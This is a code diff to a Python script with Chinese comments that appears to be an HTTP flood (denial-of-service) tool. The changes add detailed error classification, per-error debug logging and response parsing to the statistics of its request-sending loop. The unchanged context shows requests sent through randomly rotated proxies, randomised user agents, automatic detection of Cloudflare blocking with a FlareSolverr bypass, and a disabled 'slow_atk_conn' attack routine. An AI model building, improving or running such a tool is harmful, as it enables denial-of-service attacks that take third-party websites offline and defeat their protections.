@@ -250,28 +250,41 @@ def get_flaresolverr_session():
     return session_dict, headers
 
 
-def update_stats_sample(status_code=None, is_error=False):
-    """采样统计版本 - 只对部分请求进行详细统计"""
+def update_stats_simple(status_code=None, is_error=False, error_type=None, debug_info=None):
+    """简化的统计更新 - 增强版"""
     global request_count, status_codes, error_count, success_count
     
     with stats_lock:
         request_count += 1
         
-        # 只对每SAMPLE_RATE个请求中的1个进行详细统计
+        # 每个请求都进行基本统计，但只采样详细分析
         if request_count % SAMPLE_RATE == 0:
             if is_error:
                 error_count += 1
-                status_codes['ERROR'] += 1
+                error_key = f"ERROR_{error_type}" if error_type else "ERROR_UNKNOWN"
+                status_codes[error_key] += 1
+                
+                # 记录详细的错误信息
+                if debug_info:
+                    print(f"[DEBUG] 错误详情 - 类型: {error_type}, 信息: {debug_info}")
+                    
             elif status_code:
                 success_count += 1
                 status_codes[status_code] += 1
+            else:
+                # UNKNOWN状态 - 详细记录原因
+                error_count += 1
+                unknown_key = f"UNKNOWN_{error_type}" if error_type else "UNKNOWN_NO_RESPONSE"
+                status_codes[unknown_key] += 1
+                
+                print(f"[DEBUG] UNKNOWN状态 - 原因: {error_type or 'NO_RESPONSE'}, 详情: {debug_info or 'N/A'}")
         
-        # 每达到报告间隔就打印统计信息
+        # 打印统计
         if request_count % REPORT_INTERVAL == 0:
             print_stats()
 
 def print_stats():
-    """打印统计信息"""
+    """打印统计信息 - 增强版"""
     elapsed_time = time.time() - start_time
     rps = request_count / elapsed_time if elapsed_time > 0 else 0
     
@@ -285,29 +298,84 @@ def print_stats():
     # 按状态码分组显示（基于采样数据）
     if status_codes:
         print("状态码分布 (采样数据):")
-        sorted_codes = sorted(status_codes.items(), key=lambda x: x[1], reverse=True)
-        total_samples = sum(status_codes.values())
-        for code, count in sorted_codes:
-            percentage = (count / total_samples) * 100 if total_samples > 0 else 0
-            estimated_total = count * SAMPLE_RATE  # 估算总数
-            print(f"  {code}: {count} 次采样 ({percentage:.1f}%) [估算总数: ~{estimated_total}]")
+        
+        # 分类显示
+        success_codes = {}
+        error_codes = {}
+        unknown_codes = {}
+        
+        for code, count in status_codes.items():
+            if isinstance(code, int) or (isinstance(code, str) and code.isdigit()):
+                success_codes[code] = count
+            elif code.startswith('ERROR_'):
+                error_codes[code] = count
+            elif code.startswith('UNKNOWN_'):
+                unknown_codes[code] = count
+            else:
+                error_codes[code] = count
+        
+        # 显示成功响应
+        if success_codes:
+            print("  ✅ 成功响应:")
+            for code, count in sorted(success_codes.items(), key=lambda x: x[1], reverse=True):
+                percentage = (count / sum(status_codes.values())) * 100
+                estimated_total = count * SAMPLE_RATE
+                print(f"    HTTP {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
+        
+        # 显示错误响应
+        if error_codes:
+            print("  ❌ 错误响应:")
+            for code, count in sorted(error_codes.items(), key=lambda x: x[1], reverse=True):
+                percentage = (count / sum(status_codes.values())) * 100
+                estimated_total = count * SAMPLE_RATE
+                print(f"    {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
+        
+        # 显示未知响应
+        if unknown_codes:
+            print("  ❓ 未知响应:")
+            for code, count in sorted(unknown_codes.items(), key=lambda x: x[1], reverse=True):
+                percentage = (count / sum(status_codes.values())) * 100
+                estimated_total = count * SAMPLE_RATE
+                print(f"    {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
     
     print(f"{'='*60}\n")
 
 def parse_response(response_data):
-    """解析HTTP响应获取状态码"""
+    """解析HTTP响应获取状态码 - 增强版"""
     try:
-        if response_data:
-            response_str = response_data.decode('utf-8', errors='ignore')
-            lines = response_str.split('\n')
-            if lines and 'HTTP/' in lines[0]:
-                parts = lines[0].split()
-                if len(parts) >= 2:
-                    return int(parts[1])
-    except:
-        pass
-    return None
-	
+        if not response_data:
+            return None
+            
+        response_str = response_data.decode('utf-8', errors='ignore')
+        lines = response_str.split('\n')
+        
+        if not lines:
+            print(f"[DEBUG] 响应解析失败: 没有行数据")
+            return None
+            
+        first_line = lines[0].strip()
+        if 'HTTP/' not in first_line:
+            print(f"[DEBUG] 响应解析失败: 首行不包含HTTP - '{first_line[:50]}'")
+            return None
+            
+        parts = first_line.split()
+        if len(parts) < 2:
+            print(f"[DEBUG] 响应解析失败: HTTP行格式错误 - '{first_line}'")
+            return None
+            
+        try:
+            status_code = int(parts[1])
+            return status_code
+        except ValueError:
+            print(f"[DEBUG] 响应解析失败: 状态码不是数字 - '{parts[1]}'")
+            return None
+            
+    except UnicodeDecodeError as e:
+        print(f"[DEBUG] 响应解析失败: 编码错误 - {str(e)}")
+        return None
+    except Exception as e:
+        print(f"[DEBUG] 响应解析失败: 未知错误 - {str(e)}")
+        return None
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -664,67 +732,83 @@ def post(event, proxy_type):
                     sent = s.send(str.encode(request))
                     if not sent:
                         proxy = Choice(proxies).strip().split(":")
-                        update_stats_simple(is_error=True)
+                        update_stats_simple(is_error=True, error_type="SEND_FAILED", 
+                                          debug_info=f"发送失败，代理: {proxy[0]}:{proxy[1]}")
                         break
                     
                     # 尝试接收响应并统计
                     try:
+                        s.settimeout(2)  # 设置接收超时
                         response = s.recv(1024)
-                        status_code = parse_response(response)
-                        update_stats_simple(status_code=status_code)
                         
-                        # 检测CF并更新header
-                        if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
-                            print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
-                            USE_FLARESOLVERR = True
-                            full_url = f"{protocol}://{target}:{port}{path}"
-                            if solve_cloudflare(full_url):
-                                print("[CF绕过] Cloudflare挑战已解决")
-                                request = GenReqHeader("post")
+                        if not response:
+                            update_stats_simple(status_code=None, error_type="EMPTY_RESPONSE", 
+                                              debug_info="服务器返回空响应")
+                            continue
+                            
+                        status_code = parse_response(response)
+                        
+                        if status_code:
+                            update_stats_simple(status_code=status_code)
+                            
+                            # 检测CF并更新header
+                            if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
+                                print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
+                                USE_FLARESOLVERR = True
+                                full_url = f"{protocol}://{target}:{port}{path}"
+                                if solve_cloudflare(full_url):
+                                    print("[CF绕过] Cloudflare挑战已解决")
+                                    request = GenReqHeader("post")
+                        else:
+                            # 无法解析状态码
+                            response_preview = response[:100].decode('utf-8', errors='ignore')
+                            update_stats_simple(status_code=None, error_type="PARSE_FAILED", 
+                                              debug_info=f"无法解析状态码，响应前100字符: {response_preview}")
+                            
+                    except socket.timeout:
+                        update_stats_simple(is_error=True, error_type="RECV_TIMEOUT", 
+                                          debug_info="接收响应超时")
+                    except socket.error as e:
+                        update_stats_simple(is_error=True, error_type="SOCKET_ERROR", 
+                                          debug_info=f"Socket错误: {str(e)}")
                     except Exception as recv_error:
-                        update_stats_simple(is_error=True)
-                        # print(f"[DEBUG] Recv error: {recv_error}")  # 调试用
+                        update_stats_simple(is_error=True, error_type="RECV_EXCEPTION", 
+                                          debug_info=f"接收异常: {str(recv_error)}")
                         
                 s.close()
             except Exception as inner_error:
                 s.close()
-                update_stats_simple(is_error=True)
-                # print(f"[DEBUG] Inner loop error: {inner_error}")  # 调试用
+                update_stats_simple(is_error=True, error_type="INNER_LOOP", 
+                                  debug_info=f"内部循环异常: {str(inner_error)}")
                 
+        except socket.gaierror as e:
+            s.close()
+            proxy = Choice(proxies).strip().split(":")
+            error_count += 1
+            update_stats_simple(is_error=True, error_type="DNS_ERROR", 
+                              debug_info=f"DNS解析错误: {str(e)}")
+        except socket.timeout:
+            s.close()
+            proxy = Choice(proxies).strip().split(":")
+            error_count += 1
+            update_stats_simple(is_error=True, error_type="CONNECT_TIMEOUT", 
+                              debug_info="连接超时")
+        except ConnectionRefusedError:
+            s.close()
+            proxy = Choice(proxies).strip().split(":")
+            error_count += 1
+            update_stats_simple(is_error=True, error_type="CONNECTION_REFUSED", 
+                              debug_info=f"连接被拒绝，代理: {proxy[0]}:{proxy[1]}")
         except Exception as outer_error:
             s.close()
             proxy = Choice(proxies).strip().split(":")
             error_count += 1
-            update_stats_simple(is_error=True)
+            update_stats_simple(is_error=True, error_type="CONNECT_ERROR", 
+                              debug_info=f"连接异常: {str(outer_error)}")
             
             # 每50次连续错误打印一次警告
             if error_count % max_errors == 0:
                 print(f"[WARNING] POST线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")
-                print(f"[DEBUG] 错误详情: {outer_error}")  # 调试用
-
-def update_stats_simple(status_code=None, is_error=False):
-    """简化的统计更新"""
-    global request_count, status_codes, error_count, success_count
-    
-    with stats_lock:
-        request_count += 1
-        
-        # 每个请求都进行基本统计，但只采样详细分析
-        if request_count % SAMPLE_RATE == 0:
-            if is_error:
-                error_count += 1
-                status_codes['ERROR'] += 1
-            elif status_code:
-                success_count += 1
-                status_codes[status_code] += 1
-            else:
-                # 未知状态也算作采样
-                error_count += 1
-                status_codes['UNKNOWN'] += 1
-        
-        # 打印统计
-        if request_count % REPORT_INTERVAL == 0:
-            print_stats()
 
 ''' idk why it's not working, so i temporarily removed it
 def slow_atk_conn(proxy_type,rlock):
